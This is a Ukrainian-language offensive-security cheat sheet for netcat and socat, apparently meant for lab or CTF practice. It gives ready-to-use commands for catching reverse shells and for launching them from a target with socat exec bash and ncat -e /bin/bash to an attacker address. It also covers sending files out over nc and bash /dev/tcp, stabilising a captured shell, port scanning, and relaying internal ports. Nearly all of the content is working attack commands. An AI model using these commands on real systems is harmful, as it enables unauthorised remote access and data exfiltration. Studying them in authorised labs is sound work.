# Cheatsheet: Netcat / Socat

Listener для reverse shell, banner grab, передача файлів. ← [initial-access](../01-roadmaps/initial-access.md) · [revshells](webshells-revshells.md)

## Netcat — listener (прийом reverse shell)
```bash
nc -lvnp 4444          # -l слухати -v verbose -n без DNS -p порт
# listener на VPN-адресі 10.8.N.x, НЕ на 127.0.0.1
```

## Banner grab / ручне підключення
```bash
nc -nv $TARGET 25           # SMTP banner
nc -nv $TARGET 8080         # далі руками: GET / HTTP/1.0 <Enter><Enter>
```

## Передача файлів
```bash
# приймач:    nc -lvnp 9001 > file
# відправник: nc 10.8.N.x 9001 < file
```

## Стабілізація отриманого shell
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter, далі:
export TERM=xterm; export SHELL=/bin/bash
# розмір терміналу (щоб не ламався vim/less): stty rows 50 cols 200
```

## Більше прийомів nc/ncat
```bash
nc -zvn $TARGET 1-1000              # швидкий port-scan (-z без даних, -v результат)
nc -zvu $TARGET 53 123 161         # UDP-порти (-u)
nc -nv $TARGET 80                   # ручний HTTP: GET / HTTP/1.1  +  Host: x  + <Enter><Enter>
printf 'stats\r\n' | nc -q1 $TARGET 11211   # дамп unauth-сервісу (memcached/redis-стиль)
ncat --ssl $TARGET 443             # під'єднатись до TLS-сервісу (банер за шифруванням)
# передача без nc на цілі (bash /dev/tcp):
cat file > /dev/tcp/10.8.N.x/9001  # приймач локально: nc -lvnp 9001 > file
```

## Socat (надійніший, повний TTY)
```bash
# локально (listener):
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
# на ЦІЛІ (якщо є socat):
socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:10.8.N.x:4444
```
Port-relay (пробросити внутрішній порт назовні):
```bash
socat TCP-LISTEN:8081,fork TCP:127.0.0.1:8080
```
Шифрований listener (ncat, коли треба TLS):
```bash
ncat --ssl -lvnp 4444                              # локально
# на цілі: ncat --ssl 10.8.N.x 4444 -e /bin/bash
```

## Пастки
- Shell не приходить → listener на localhost замість VPN-адреси, або payload з неправильним IP.
- Firewall на вихід → порти 80/443 у payload.
- `nc` без `-e` на цілі → mkfifo-варіант ([revshells](webshells-revshells.md)).
